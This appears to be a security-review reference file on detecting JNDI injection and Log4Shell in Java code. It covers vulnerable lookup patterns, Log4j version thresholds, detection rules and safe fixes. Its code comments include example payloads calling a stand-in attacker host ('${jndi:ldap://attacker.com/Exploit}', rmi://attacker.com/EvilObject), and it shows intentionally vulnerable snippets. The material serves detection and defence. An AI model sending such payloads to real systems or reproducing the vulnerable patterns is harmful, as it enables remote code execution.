---
name: jndi_injection
description: JNDI injection detection — vulnerable code patterns where user input reaches JNDI lookup calls enabling RCE via LDAP/RMI object loading (Log4Shell and beyond)
---

# JNDI Injection

JNDI (Java Naming and Directory Interface) injection occurs when user-controlled input reaches a `InitialContext.lookup()` call or equivalent, allowing an attacker to load a remote Java object from an LDAP or RMI server they control, resulting in Remote Code Execution.

## CWE Classification

- **CWE-74**: Improper Neutralization of Special Elements in Output Used by a Downstream Component (parent)
- **CWE-917**: Improper Neutralization of Special Elements used in an Expression Language Statement (secondary/scanner alias — primary classes for JNDI injection are CWE-74 and CWE-502)
- **CWE-502**: Deserialization of Untrusted Data (remote class/object loading via JNDI)
- **CWE-918**: Server-Side Request Forgery (when used to reach internal services)

## Source → Sink Pattern

**Sources**: HTTP parameters, headers (`User-Agent`, `X-Forwarded-For`, `Referer`, `X-Api-Version`), request body, log messages that include user data

**Sinks**:
- `new InitialContext().lookup(userInput)`
- `context.lookup(userInput)` — any `javax.naming.Context`
- `jndiTemplate.lookup(userInput, ...)`
- Logging frameworks that perform JNDI lookups on `${jndi:...}` patterns in log messages
- `Context.lookup` / `InitialContext.lookup` name argument
- `Hashtable.put` / `setProperty` with `Context.PROVIDER_URL` or `"java.naming.provider.url"`
- Spring LDAP `LdapOperations.lookup`, `search`, `list`, `findByDn`, etc. (name/base DN args)
- `LdapOperations.search(..., scope=true)` and `unbind(..., recursive=true)` when name is tainted
- Taint steps: `new CompositeName(tainted)`, `CompoundName.add(tainted)`, `new JMXServiceURL(tainted)`, `JMXConnectorFactory.newJMXConnector`, `new RMIConnector(tainted)`
- **Log4Shell**: user data flowing into Log4j2 `Logger` methods (`info`, `warn`, `error`, `debug`, etc.) — message lookup substitution; version may not be verified statically
- **XSLT overlap** (CWE-074, not JNDI): user-controlled XSLT stylesheet → file read/RCE via transform pipeline

**Sanitizers / barriers**:
- Name validation before lookup (`isValid(name)` pattern)
- Hardcoded JNDI names — no remote flow
- Log4j ≥2.15 default, `-Dlog4j2.formatMsgNoLookups=true`, remove `JndiLookup` class — upgrade mitigates (version may not be modeled)
- `TransformerFactory.setFeature(FEATURE_SECURE_PROCESSING, true)` for XSLT paths

Commonly affected languages: Java (primary); Python, JavaScript, Ruby, and C# require manual review for equivalent patterns.

## Vulnerable Code Patterns

### Direct JNDI Lookup

```java
// VULNERABLE: user input used as JNDI resource name
String datasource = request.getParameter("ds");
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup(datasource);
// attacker passes: ldap://attacker.com/Exploit → loads remote class → RCE

// VULNERABLE: lookup with concatenated user-controlled path
String userGroup = request.getParameter("group");
Object obj = new InitialContext().lookup("ldap://internal-server/" + userGroup);

// VULNERABLE: Spring JndiTemplate wrapping user input
JndiTemplate jndiTemplate = new JndiTemplate();
Object resource = jndiTemplate.lookup(request.getParameter("resource"));
```

**VULN indicator**: Any `Context.lookup(...)` call where the lookup name is fully or partially controlled by external input.

### Logging-Framework Lookup Injection (Log4Shell class)

**General pattern**: When a logging framework performs string interpolation / lookups on the log message itself, logging untrusted data turns an ordinary log call into a lookup/JNDI sink — the framework evaluates embedded expressions such as `${jndi:...}` contained in attacker input. Treat any logger that interpolates message *content* (not just format placeholders) as a candidate sink. Log4Shell (CVE-2021-44228) is the canonical instance of this class.

```java
// VULNERABLE: Log4j2 logging of user-controlled data triggers JNDI lookup
// in Log4j2 versions < 2.15.0 (or < 2.17.0 for some bypass vectors)
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

Logger logger = LogManager.getLogger(MyClass.class);

// Any of these patterns is VULNERABLE if the logged value contains ${jndi:...}:
logger.info("User-Agent: {}", request.getHeader("User-Agent"));
logger.error("Login failed for: " + request.getParameter("username"));
logger.warn("Request path: {}", request.getRequestURI());

// Attacker sends: User-Agent: ${jndi:ldap://attacker.com/Exploit}
// Log4j2 interpolates the ${jndi:...} expression → JNDI lookup → RCE
```

**VULN condition** (Log4j2 example of the class):
1. A logging framework that interpolates message content is in use (e.g. `log4j-core` version < 2.15.0 in `pom.xml` / `build.gradle`)
2. Logger logging user-controlled data (HTTP headers, params, body, path)
3. Message-lookup interpolation enabled (e.g. `log4j2.formatMsgNoLookups=false`, the default in vulnerable versions)

**SAFE indicators**:
- `log4j-core` version >= 2.16.0 closes the JNDI lookup RCE path (CVE-2021-44228/45046); >= 2.17.1 required for fully patched (CVE-2021-45105 DoS, CVE-2021-44832 RCE-via-config)
- JVM arg `-Dlog4j2.formatMsgNoLookups=true`
- `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` env var
- `PatternLayout` with `%msg{nolookups}` in `log4j2.xml`

### Spring JNDI / JDBC DataSource via JNDI

```java
// VULNERABLE: Spring DataSource configured via user-influenced JNDI name
// In application.properties or user-supplied config:
// spring.datasource.jndi-name=rmi://attacker.com/Exploit
JndiDataSourceLookup lookup = new JndiDataSourceLookup();
DataSource ds = lookup.getDataSource(userSuppliedJndiName);

// VULNERABLE: JPA/Hibernate persistence unit with user-controlled JNDI
// persistence.xml: <non-jta-data-source>${userInput}</non-jta-data-source>
```

### RMI Registry Lookup

```java
// VULNERABLE: RMI lookup with user-controlled registry URL
String rmiUrl = request.getParameter("service");
Remote obj = Naming.lookup(rmiUrl);  // rmi://attacker.com/EvilObject → RCE

// VULNERABLE: Registry lookup
Registry registry = LocateRegistry.getRegistry(userHost, userPort);
Object stub = registry.lookup(userServiceName);
```

### LDAP / LDAPS Client Code

```java
// VULNERABLE: LDAP search with user-controlled attribute value (LDAP injection risk + JNDI chain)
DirContext ctx = new InitialDirContext(env);
String filter = "(uid=" + request.getParameter("user") + ")";
NamingEnumeration<?> results = ctx.search("ou=people,dc=example,dc=com", filter, controls);
// If javaSerializedData / javaClassName attributes are returned and processed, potential deserialization
```

## Detection Signals by Dependency

### Maven/Gradle — Vulnerable Log4j Versions

```xml
<!-- pom.xml — VULNERABLE versions -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  <!-- CVE-2021-44228 -->
</dependency>
<!-- Any version < 2.17.0 is potentially vulnerable to some Log4Shell variant -->
```

**Version thresholds**:
- `< 2.15.0`: Original Log4Shell (CVE-2021-44228)
- `< 2.16.0`: Bypass (CVE-2021-45046) — upgrade to >= 2.16.0 closes JNDI lookup RCE
- `< 2.17.1`: DoS (CVE-2021-45105) and RCE via configuration (CVE-2021-44832) — fully patched requires >= 2.17.1 (< 2.12.4 Java 8 / < 2.3.2 Java 7 for backports)

### Classpath Gadgets That Enable JNDI RCE

When JNDI lookup loads a remote class, execution occurs in the JVM. The following libraries extend impact:
- `commons-collections` (any version)
- `spring-beans` / `spring-core`
- `org.codehaus.groovy:groovy`
- `bsh:bsh` (BeanShell)

Their presence on the classpath combined with `InitialContext.lookup(userInput)` = **CRITICAL**.

## Java Source Detection Rules

### TRUE POSITIVE

- `new InitialContext().lookup(userInput)` where `userInput` is any HTTP request value → **CONFIRM** (JNDI injection / SSRF / potential RCE)
- `Context.lookup(url)` where `url` contains `ldap://`, `rmi://`, `dns://`, `corba://`, or `iiop://` prefix coming from request data → **CONFIRM**
- Log4j-core < 2.15.0 + `logger.info/warn/error/debug(...)` logging any user-controlled string → **CONFIRM** (Log4Shell)
- `JndiTemplate.lookup(request.getParameter(...))` → **CONFIRM**

### FALSE POSITIVE

- `Context.lookup("java:comp/env/jdbc/MyDS")` — fully hardcoded JNDI name, no user input → **NOT JNDI injection**
- `InitialContext.lookup(appConfig.getJndiName())` — name from server config, not user input → **NOT JNDI injection**
- Log4j-core >= 2.17.1 (fully patched) or >= 2.16.0 with JNDI lookup RCE mitigated; `formatMsgNoLookups` or `noConsoleNoAnsi` patterns → **SAFE** for Log4Shell JNDI lookup path
- Log4j1.x — does NOT support `${jndi:...}` lookup syntax (Log4Shell is Log4j2 only)

## JNDI Lookup URL Schemes to Flag

Any user-controlled string that could contain:
- `ldap://` or `ldaps://` — LDAP/LDAPS object factory loading
- `rmi://` — Java RMI object loading
- `dns://` — DNS resolution (information disclosure)
- `corba://` or `iiop://` — CORBA/IIOP object loading
- `jndi:ldap://`, `${jndi:...}` — Log4Shell interpolation pattern

## Severity

| Pattern | Severity |
|---------|----------|
| Direct `InitialContext.lookup(userInput)` | Critical |
| Log4Shell: log4j2 < 2.15.0 logging user HTTP headers/params | Critical |
| RMI `Naming.lookup(userInput)` | Critical |
| LDAP search filter injection (without object loading) | High |
| DNS-only JNDI lookup (information disclosure) | Medium |
- FALSE POSITIVE guard: `log4j`, `fastjson`, or similar component demos are not `jndi_injection` unless untrusted data reaches an actual JNDI lookup sink such as `InitialContext.lookup`, `${jndi:...}`, or equivalent runtime resolution.

## Safe Patterns

```java
// GOOD: validate lookup name before lookup
if (isValid(name)) {
  ctx.lookup(name);
}

// GOOD: hardcoded JNDI name
ctx.lookup("java:comp/env/jdbc/MyDS");
```

Log4j: upgrade to ≥2.17; set `log4j2.formatMsgNoLookups=true`; never log raw `${...}` from users on vulnerable versions.

## Common False Alarms

- Fully constant JNDI name or provider URL — no remote/user input path.
- Log4j on patched versions — static analysis may still alert (version-agnostic); verify dependency before CONFIRM Log4Shell.
- LDAP filter injection without JNDI object loading — different CWE; see `ldap_injection.md` for filters.
- Demo references to Log4j/Fastjson without taint to lookup or logger sink.

## Business Risk

JNDI/LDAP/RMI URL in lookup loads attacker-controlled objects → RCE (Log4Shell, classic `InitialContext.lookup`). XSLT injection adds file disclosure and transform-time code execution.

## Core Principle

Never pass untrusted strings to JNDI lookup names or provider URLs; treat log message bodies as potential JNDI interpolation on Log4j2 &lt;2.15.
